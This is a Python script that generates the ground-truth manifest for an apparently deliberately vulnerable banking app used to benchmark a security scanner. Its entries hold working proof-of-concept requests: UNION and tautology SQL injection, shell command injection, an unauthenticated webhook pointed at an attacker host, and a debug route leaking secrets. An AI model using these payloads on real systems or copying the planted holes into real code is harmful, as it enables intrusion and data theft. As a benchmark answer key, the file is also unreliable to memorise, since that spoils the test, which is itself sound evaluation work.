#!/usr/bin/env python3
"""Generate manifest.yaml for vulnbank-adaptive.

This file is the only place the v2 ground truth is written. Never hand-edit
manifest.yaml — edit this script and re-run it.

The seven Redfall 0.1.0 entries carry an `adaptive:` block naming the trigger type
they exist to exercise, how a scanner can discover the surface at runtime, and
why that discovery has to happen mid-scan rather than at planning time.
"""

from __future__ import annotations

from pathlib import Path

import yaml

TARGET = Path(__file__).resolve().parent.parent


def http(method: str, path: str, body: str | None = None, *, content_type: str = "application/json") -> str:
    """Build a raw HTTP request string, the format replay_poc.ts consumes."""
    payload = body if body is not None else ""
    lines = [f"{method} {path} HTTP/1.1", "Host: localhost:4001"]
    if payload:
        lines += [f"Content-Type: {content_type}", f"Content-Length: {len(payload.encode())}"]
    return "\n".join(lines) + "\n\n" + payload + "\n"


V2_VULNS = [
    {
        "id": "VULN-033",
        "route": "GET /api/routes",
        "category": "dynamic_route_registration",
        "cwe": "CWE-94",
        "severity": "high",
        "location": {
            "file": "src/routes/dynamic.ts",
            "symbol": "loadRouteFromDB",
            "lines": [34],
        },
        "description": (
            "Routes are registered from the route_config table, so the HTTP surface is data. "
            "No source file names /legacy/reports or /legacy/ledger; they exist only because a "
            "row says so, and GET /api/routes discloses the full set including the SQL each runs."
        ),
        "adaptive": {
            "trigger_type": "dynamic_route_registration",
            "discoverable_from": "GET /api/routes (returns route_config rows and stored SQL)",
            "reason": (
                "Redfall must read the route list from the running application, then spawn a "
                "branch per discovered route. The routes are absent from the source tree, so a "
                "planning-time scan cannot enumerate them."
            ),
        },
        "poc": {
            "type": "http",
            "request": http("GET", "/api/routes"),
            "expect": "The response lists database-registered routes that appear nowhere in source",
            "expect_expr": (
                "status === 200 && Array.isArray(json.routes) "
                "&& json.routes.some(r => r.path === '/legacy/reports') "
                "&& json.routes.some(r => r.path === '/legacy/ledger')"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
    {
        "id": "VULN-034",
        "route": "GET /api/plugins/envinfo",
        "category": "dynamic_import",
        "cwe": "CWE-94",
        "severity": "critical",
        "location": {
            "file": "src/routes/plugins.ts",
            "symbol": "loadPluginFromEnv",
            "lines": [33],
        },
        "description": (
            "require(process.env.PLUGIN_PATH) loads a module chosen by the environment with no "
            "allowlist. Whoever controls PLUGIN_PATH controls which code the application executes, "
            "and the loaded plugin's routes are served to any caller."
        ),
        "adaptive": {
            "trigger_type": "dynamic_import",
            "discoverable_from": "GET /api/plugins (reports plugin_path_env and the loaded set)",
            "reason": (
                "The imported module is not in the source tree, so the branch can only be scoped "
                "after observing which module the process actually loaded."
            ),
        },
        "poc": {
            "type": "http",
            "request": http("GET", "/api/plugins/envinfo"),
            "expect": "A route served only by the module named in PLUGIN_PATH responds",
            "expect_expr": (
                "status === 200 && json.loaded_via === 'PLUGIN_PATH' "
                "&& typeof json.stdout === 'string' && json.stdout.includes('envplugin-loaded')"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
    {
        "id": "VULN-035",
        "route": "GET /api/beta/export",
        "category": "sqli",
        "cwe": "CWE-89",
        "severity": "critical",
        "location": {
            "file": "src/routes/conditional.ts",
            "symbol": "registerBetaExport",
            "lines": [24],
        },
        "description": (
            "The beta exporter ships behind FEATURE_BETA_EXPORT and never went through review, so "
            "it still concatenates the account parameter into SQL. A UNION across to users returns "
            "every role including admin."
        ),
        "adaptive": {
            "trigger_type": "feature_flag",
            "discoverable_from": "GET /api/surfaces (lists conditional surfaces and their conditions)",
            "reason": (
                "The route does not exist unless the flag is on. Redfall has to learn the flag "
                "exists, enable it, and then scan a route that was not there before."
            ),
        },
        "poc": {
            "type": "http",
            "request": http(
                "GET",
                "/api/beta/export?account=%27%20UNION%20SELECT%20id%2C%20username%2C%20role%2C%20balance%3A%3Atext%20FROM%20users%20--%20",
            ),
            "expect": "The response contains a row whose author column holds an admin username",
            "expect_expr": (
                "status === 200 && Array.isArray(json.rows) "
                "&& json.rows.some(r => r.author === 'admin')"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
    {
        "id": "VULN-036",
        "route": "POST /api/hooks/register",
        "category": "webhook_discovery",
        "cwe": "CWE-284",
        "severity": "high",
        "location": {
            "file": "src/routes/conditional.ts",
            "symbol": "registerWebhooks",
            "lines": [36],
        },
        "description": (
            "When WEBHOOK_ENABLED=true the application exposes subscription registration and an "
            "unauthenticated, signature-free delivery endpoint. Anything that finds the surface can "
            "register a destination and push forged events straight into the audit log."
        ),
        "adaptive": {
            "trigger_type": "webhook_discovery",
            "discoverable_from": "GET /api/surfaces (names the webhook surface and its condition)",
            "reason": (
                "The endpoints are registered conditionally, so each registered webhook target "
                "needs its own branch, spawned after the surface is observed."
            ),
        },
        "poc": {
            "type": "http",
            "request": http(
                "POST",
                "/api/hooks/register",
                '{"url":"https://attacker.test/hook","event":"transfer.completed"}',
            ),
            "expect": (
                "A subscription is created for an attacker-controlled URL, and the follow-up "
                "delivery is accepted with no signature and no authentication"
            ),
            # followup is a raw request, asserted through the followup bindings
            # that the replay harness exposes to expect_expr.
            "followup": http(
                "POST",
                "/api/hooks/deliver",
                '{"event":"transfer.completed","actor":"not-stripe"}',
            ),
            "expect_expr": (
                "status === 201 && json.subscription.url === 'https://attacker.test/hook' "
                "&& json.subscription.event === 'transfer.completed' "
                "&& followup_status === 202 && followup.accepted === true"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
    {
        "id": "VULN-037",
        "route": "GET /legacy/ledger",
        "category": "db_stored_code",
        "cwe": "CWE-89",
        "severity": "critical",
        "location": {
            "file": "src/routes/dynamic.ts",
            "symbol": "runStoredQuery",
            "lines": [76],
        },
        "description": (
            "The executed SQL text is read out of query_config and run, with the request's filter "
            "value interpolated into it. Two independent problems: the statement can be rewritten "
            "without a deploy, and the parameter is never bound."
        ),
        "adaptive": {
            "trigger_type": "db_stored_code",
            "discoverable_from": "GET /api/routes (returns stored_queries with the SQL text)",
            "reason": (
                "The sink is a second SQL string held in a table. Redfall must see the stored "
                "query, then spawn a branch for the statement that will actually execute."
            ),
        },
        "poc": {
            "type": "http",
            "request": http("GET", "/legacy/ledger?filter=1%3D1%20OR%20username%3D%27admin%27"),
            "expect": "The tautology returns every user row, including admin",
            "expect_expr": (
                "status === 200 && Array.isArray(json.rows) "
                "&& json.rows.some(r => r.username === 'admin') && json.rows.length > 1"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
    {
        "id": "VULN-038",
        "route": "GET /api/debug",
        "category": "env_conditional",
        "cwe": "CWE-200",
        "severity": "critical",
        "location": {
            "file": "src/routes/conditional.ts",
            "symbol": "registerDebug",
            "lines": [76],
        },
        "description": (
            "if (process.env.NODE_ENV === 'production') app.get('/api/debug', ...) registers a "
            "diagnostics route that returns the whole process environment, including JWT_SECRET "
            "and DATABASE_URL. It exists only in the deployment that matters most."
        ),
        "adaptive": {
            "trigger_type": "env_conditional",
            "discoverable_from": "AST match on the NODE_ENV conditional, confirmed by GET /api/surfaces",
            "reason": (
                "The route is absent under any other NODE_ENV, so a scan that never sets it cannot "
                "reach the sink. The branch must be spawned for the production configuration."
            ),
        },
        "poc": {
            "type": "http",
            "request": http("GET", "/api/debug"),
            "expect": "The response contains the live environment including the JWT signing secret",
            "expect_expr": (
                "status === 200 && json.node_env === 'production' "
                "&& typeof json.env.JWT_SECRET === 'string' && json.env.JWT_SECRET.length > 0 "
                "&& String(json.env.DATABASE_URL).startsWith('postgresql://')"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
    {
        "id": "VULN-039",
        "route": "GET /api/plugins/audit",
        "category": "plugin_system",
        "cwe": "CWE-78",
        "severity": "critical",
        "location": {
            "file": "src/plugins/audit.ts",
            "symbol": "routes",
            "lines": [17],
        },
        "description": (
            "The plugin loader requires every file in the plugin directory on boot, and nothing "
            "imports src/plugins/audit.ts. The endpoint it adds concatenates the cmd parameter "
            "into a shell string, so discovering the plugin system leads straight to command "
            "injection."
        ),
        "adaptive": {
            "trigger_type": "plugin_system",
            "discoverable_from": "GET /api/plugins (reports plugin_dir and every loaded plugin)",
            "reason": (
                "A scanner following imports never reaches this file. The branch can only be "
                "scoped from the directory listing the loader reports at runtime."
            ),
        },
        "poc": {
            "type": "http",
            "request": http("GET", "/api/plugins/audit?cmd=echo%20V2_PLUGIN_RCE_MARKER"),
            "expect": "The injected command's output appears in the response",
            "expect_expr": (
                "status === 200 && typeof json.stdout === 'string' "
                "&& json.stdout.includes('audit-start') "
                "&& json.stdout.includes('V2_PLUGIN_RCE_MARKER')"
            ),
        },
        "tests_that_must_stay_green": ["tests/adaptive.test.ts"],
    },
]


def main() -> None:
    document = {
        "version": 2,
        "target": "vulnbank-adaptive",
        "based_on": "vulnbank (32 inherited vulnerabilities)",
        "note": (
            "Generated by scripts/write_manifest.py. The seven entries below are the adaptive "
            "surfaces; each names the trigger type it exists to exercise. The remaining "
            "vulnerabilities are inherited from the base app and scored against its own manifest."
        ),
        "adaptive_trigger_types": sorted({v["adaptive"]["trigger_type"] for v in V2_VULNS}),
        "vulns": V2_VULNS,
    }
    out = TARGET / "manifest.yaml"
    out.write_text(yaml.safe_dump(document, sort_keys=False, width=100, allow_unicode=True))
    print(f"wrote {out}: {len(V2_VULNS)} vulns, {len(document['adaptive_trigger_types'])} trigger types")


if __name__ == "__main__":
    main()
